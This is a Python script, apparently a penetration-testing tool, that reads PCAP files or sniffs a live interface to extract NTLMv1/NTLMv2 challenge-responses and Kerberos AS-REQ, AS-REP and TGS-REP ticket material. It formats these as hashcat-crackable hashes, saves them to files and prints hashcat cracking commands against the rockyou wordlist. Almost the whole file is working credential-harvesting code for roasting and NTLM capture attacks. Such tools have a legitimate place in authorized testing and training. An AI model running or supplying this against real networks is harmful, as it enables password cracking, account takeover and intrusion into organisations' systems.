#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pathlib import Path
import pyshark
import json
from colorama import Fore, Back, Style

import argparse
parser = argparse.ArgumentParser(description='Parse PCAP file for secrets')
parser.add_argument("--file","-f", type=str, help='PCAP file to parse')
parser.add_argument("--outdir","-o", type=str, default=Path().resolve(), help='Output dir')
parser.add_argument("--debug","-d", action='store_true', help='Enable debug')
parser.add_argument("--live","-l", action='store_true', help='Use live capture')
parser.add_argument("--interface","-i", type=str, help='Interface to capture if using live mode', default='tun0')
args = parser.parse_args()

KRB_MSG = {
    10: 'AS REQUEST',
    11: 'AS RESPONSE',
    12: 'TGS REQUEST',
    13: 'TGS RESPONSE',
    14: 'AP REQUEST',
    15: 'AP RESPONSE',
}

HASH_FORMAT = {
    'ntlmv1': 5500,
    'ntlmv2': 5600,
    'krb5_as_req_17': 19800,
    'krb5_as_req_18': 19900,
    'krb5_as_rep_23': 18200,
    'krb5_tgs_rep_17': 19600,
    'krb5_tgs_rep_18': 19700,
    'krb5_tgs_rep_23': 13100,
}

banner="""
          ▌       
 ▛▌▛▘▀▌▛▌▛▌▌▌▛▛▌▛▌
 ▙▌▙▖█▌▙▌▙▌▙▌▌▌▌▙▌
 ▌     ▌        ▌ 
          v1.0.0
"""

NTLMSSP_CHAL={}
HASH_FILES={}

def WriteHash(filename, hash):
    hashformat = HASH_FORMAT.get(filename, None)

    filename = f"{args.outdir}/pcapdump_{filename}.txt"
    if not Path(filename).is_file():
        open(filename, 'a').close()

    with open(filename, "r+") as file:
        ends_with_newline = True
        for line in file:
            ends_with_newline = line.endswith("\n")
            if line.rstrip("\n\r") == hash:
                break
        else: # not found, we are at the eof
            if not ends_with_newline:
                file.write("\n")
            file.write(hash + "\n") # append missing data

    if filename not in HASH_FILES.keys():
        HASH_FILES[filename]=hashformat

def Get_SrcDst(pkt):
    frame = pkt.number
    src = None
    dst = None
    srcport = None
    dstport = None
    proto = None

    if 'IP' in pkt:
        src = pkt.IP.src
        dst = pkt.IP.dst
    elif 'IPV6' in pkt:
        src = pkt.IPV6.src
        dst = pkt.IPV6.dst

    if 'TCP' in pkt:
        proto = 'TCP'
        srcport = pkt.tcp.srcport
        dstport = pkt.tcp.dstport

    elif 'UDP' in pkt:
        proto = 'UDP'
        srcport = pkt.udp.srcport
        dstport = pkt.udp.dstport

    return frame, proto, src, dst, srcport, dstport

def Parse_NTLMSSP(pkt):

    # We check if layer contain ntlmssp
    layer = None
    for curlayer in pkt.layers:
        if curlayer.layer_name in ['ip','ipv6','tcp','udp','raw']:
            continue
        if hasattr(curlayer, 'ntlmssp.messagetype'):
            layer = curlayer
            break

    # Return if no ntlmssp
    if layer == None:
        return

    if args.debug:
        print('-'*100)
        print(layer)
        print(json.dumps(layer._all_fields,indent=2))
    
    # Retrieve network informations
    frame, proto, src, dst, srcport, dstport = Get_SrcDst(pkt)

    # Return if not UDP/TCP
    if proto == 'TCP':
        stream = pkt.tcp.stream
    elif proto == 'UDP':
        stream = pkt.udp.stream
    else:
        print('\n[!] NTLMSSP is neither UDP/TCP')
        return
    
    # Collect challenge if msgtype 2
    if getattr(curlayer, 'ntlmssp.messagetype') == "0x00000002" and hasattr(curlayer, 'ntlmssp.ntlmserverchallenge'):
        NTLMSSP_CHAL[stream] = getattr(curlayer, 'ntlmssp.ntlmserverchallenge').replace(':', '')

    # Return if not msgtype 3
    if getattr(curlayer, 'ntlmssp.messagetype') != "0x00000003":
        return

    # Retrieve challenge from previous msgtype 2
    if stream not in NTLMSSP_CHAL.keys():
        print('[!] missing NTLM challenge')
        return
    else:
        ntlmserverchallenge = NTLMSSP_CHAL[stream]

    # We retrieve username and domain, and ensure it's not a null request
    username = curlayer.get('ntlmssp.auth.username', None)
    domain = curlayer.get('ntlmssp.auth.domain', None)
    #clihostname = curlayer.get('ntlmssp.auth.hostname', None)

    if username in ['NULL', None]:
        return

    # Annonce we have NTLMSSP message to parse
    print(Style.BRIGHT + Fore.YELLOW, end='')
    print(f"\n[*] NTLMSSP {layer.layer_name.upper()}\t{proto} {src}:{srcport} > {dst}:{dstport}\tframe {frame}" + Style.RESET_ALL)

    # Retrieve targeted server
    target_name = curlayer.get('ntlmssp.ntlmv2_response.target_name',curlayer.get('ntlmssp.ntlmv2_response.dns_computer_name',None))
    if target_name != None:
        print(Style.BRIGHT + Fore.CYAN, end='')
        print(f'SRV {target_name}' + Style.RESET_ALL)

    # Display client
    print(Style.BRIGHT + Fore.MAGENTA, end='')
    print(f'CLI {username}@{domain}' + Style.RESET_ALL)

    # Parse NTLMV2 (mode 5600)
    if hasattr(curlayer, 'ntlmssp.ntlmv2_response'):
        ntlmv2_response = getattr(curlayer, 'ntlmssp.ntlmv2_response').replace(':', '')
        
        hash = f'NTLMv2 {username}::{domain}:{ntlmserverchallenge}:{ntlmv2_response[:32]}:{ntlmv2_response[32:]}'
        print(Style.BRIGHT + Fore.GREEN, end='')
        print(f'{hash}' + Style.RESET_ALL)
        WriteHash(f"ntlmv2", hash)

    # Parse NTLMV1 (mode 5500)
    elif hasattr(curlayer, 'ntlmssp.auth.ntresponse') and hasattr(curlayer, 'ntlmssp.auth.lmresponse'):
        nt_response = getattr(curlayer, 'ntlmssp.auth.ntresponse').replace(':', '')
        lm_response = getattr(curlayer, 'ntlmssp.auth.lmresponse').replace(':', '')
        
        hash = f'{username}::{domain}:{lm_response}:{nt_response}:{ntlmserverchallenge}'
        print(Style.BRIGHT + Fore.GREEN, end='')
        print(f'NTLMv1 {hash}' + Style.RESET_ALL)
        WriteHash(f"ntlmv1", hash)
    else:
        print("[!] Unsupported hash format")

def Parse_KRB(pkt):
    krb = pkt['kerberos']

    if args.debug:
        print('-'*100)
        print(krb)
        print(json.dumps(krb._all_fields,indent=2))

    data_items = ['CNameString','SNameString','realm','crealm','addr_nb','cipher','etype','nonce']
    data = {
        'msg-type': int(krb.get_field_value('msg-type')),
    }

    # Message type (AS-REQ, TGS-REP, etc.)
    if data['msg-type'] not in KRB_MSG.keys():
        return
    else:
        frame, proto, src, dst, srcport, dstport = Get_SrcDst(pkt)
        print(Style.BRIGHT + Fore.YELLOW, end='')
        print(f"\n[*] KRB {KRB_MSG.get(data['msg-type'], data['msg-type'])}\t{proto} {src}:{srcport} > {dst}:{dstport}\tframe {frame}" + Style.RESET_ALL)

    for item in data_items:
        if hasattr(krb, item):
            field = getattr(krb, item).all_fields 
            data[item] = [x.show for x in field]
            if args.debug:
                print(f"{item} {data[item]}")

    if 'SNameString' in data.keys():
        print(Style.BRIGHT + Fore.CYAN, end='')
        print(f'SRV {data["SNameString"]}' + Style.RESET_ALL)

    if 'CNameString' in data.keys():
        print(Style.BRIGHT + Fore.MAGENTA, end='')
        print(f'CLI {data["CNameString"]}' + Style.RESET_ALL)
    
    if not 'cipher' in data.keys():
        return
    
    #####################
    # AS-REQ (Pre-auth) #
    #####################

    # Target: user

    if data['msg-type'] == 10 and set(['etype', 'CNameString', 'realm']).issubset(data.keys()):

        # Kerberos 5, etype 23, AS-REQ Pre-Auth (RC4); 7500 ✅
        if int(data['etype'][-1]) == 23 and 'nonce' in data.keys():
            hashformat = 7500
            hash = '$krb5pa${}${}${}$${}{}'.format(
                data['etype'][-1],
                data['CNameString'][-1],
                data['realm'][-1],
                data['cipher'][-1].replace(':', '')[32:],
                data['cipher'][-1].replace(':', '')[:32],
            )
        
        # Kerberos 5, etype 17, Pre-Auth ; 19800 ✅
        # Kerberos 5, etype 18, Pre-Auth ; 19900 ✅
        elif int(data['etype'][-1]) in [17,18] :
            hash = '$krb5pa${}${}${}${}'.format(
                data['etype'][-1],
                data['CNameString'][-1],
                data['realm'][-1],
                data['cipher'][-1].replace(':', ''),
            )
        else:
            return
        
        print(Style.BRIGHT + Fore.GREEN, end='')
        print(f'{hash}' + Style.RESET_ALL)
        WriteHash(f"krb5_as_req_{data['etype'][-1]}", hash)
    
    ##########
    # AS-REP #
    ##########

    # Target: user in the ticket part

    if data['msg-type'] == 11 and set(['etype', 'CNameString', 'realm']).issubset(data.keys()):

        # Kerberos 5, etype 23, AS-REP (RC4); 18200 ✅
        if int(data['etype'][0]) == 23:
            hash = '$krb5asrep${}${}@{}:{}${}'.format(
                data['etype'][0],
                data['CNameString'][0],
                data['realm'][0],
                data['cipher'][0].replace(':', '')[:32],
                data['cipher'][0].replace(':', '')[32:],
            )
        else:
            return

        print(Style.BRIGHT + Fore.GREEN, end='')
        print(f'{hash}' + Style.RESET_ALL)
        WriteHash(f"krb5_as_rep_{data['etype'][0]}", hash)

    ###########
    # TGS-REP #
    ###########

    # Target: service account in the ticket part

    if data['msg-type'] == 13 and set(['etype', 'SNameString', 'realm']).issubset(data.keys()):

        # Kerberos 5, etype 23, TGS-REP	(RC4); 13100 ✅
        if int(data['etype'][0]) == 23 and 'SNameString' in data.keys():
            hash = '$krb5tgs${}$*{}${}$*${}${}'.format(
                data['etype'][0],
                data['SNameString'][-1].split('\\')[-1],
                data['realm'][0],
                data['cipher'][0].replace(':', '')[:32],
                data['cipher'][0].replace(':', '')[32:],
            )

        # Kerberos 5, etype 17, TGS-REP (AES128-CTS-HMAC-SHA1-96) ; 19600 ✅
        # Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) ; 19700 ✅
        elif int(data['etype'][0]) in [17,18]:
            hash = '$krb5tgs${}${}${}${}${}'.format(
                data['etype'][0],
                data['SNameString'][-1].split('\\')[-1],
                data['realm'][0],
                data['cipher'][0].replace(':', '')[-24:],
                data['cipher'][0].replace(':', '')[:-24:],
            )
        else:
            return
        
        print(Style.BRIGHT + Fore.GREEN, end='')
        print(f'{hash}' + Style.RESET_ALL)
        WriteHash(f"krb5_tgs_rep_{data['etype'][0]}", hash)

def ParsePacket(pkt):
    if 'kerberos' in pkt:
        Parse_KRB(pkt)
    else:
        Parse_NTLMSSP(pkt)

def DisplayHashcat():
    if len(HASH_FILES) == 0:
        return

    print(Style.BRIGHT + Fore.YELLOW, end='')
    print("\n\n"+"!"*150+'\n'+ Style.RESET_ALL)

    wordlist='/usr/share/wordlists/rockyou.txt'
    potfile=f'--potfile-path={args.outdir}/HASHCATPOT'

    for filename, hashtype in HASH_FILES.items():
        if hashtype != None:
            print(f"hashcat -m {hashtype} {filename} {wordlist} {potfile}")
        else:
            print(f"hashcat {filename} {wordlist} {potfile}")
    
    print(Style.BRIGHT + Fore.YELLOW, end='')
    print("\n"+"!"*150+'\n'+ Style.RESET_ALL)

def main():
    if args.live:
        capture = pyshark.LiveCapture(interface=args.interface)
        for pkt in capture.sniff_continuously():
            ParsePacket(pkt)
            
    elif args.file:
        if not Path(args.file).is_file():
            print(f'[!] Not found : {args.file}')
            return
        
        pkts = pyshark.FileCapture(args.file)
        for pkt in pkts:
            ParsePacket(pkt)
        
        DisplayHashcat()

    else:
        print(banner)
        parser.print_help()

if __name__ == "__main__":
    main()
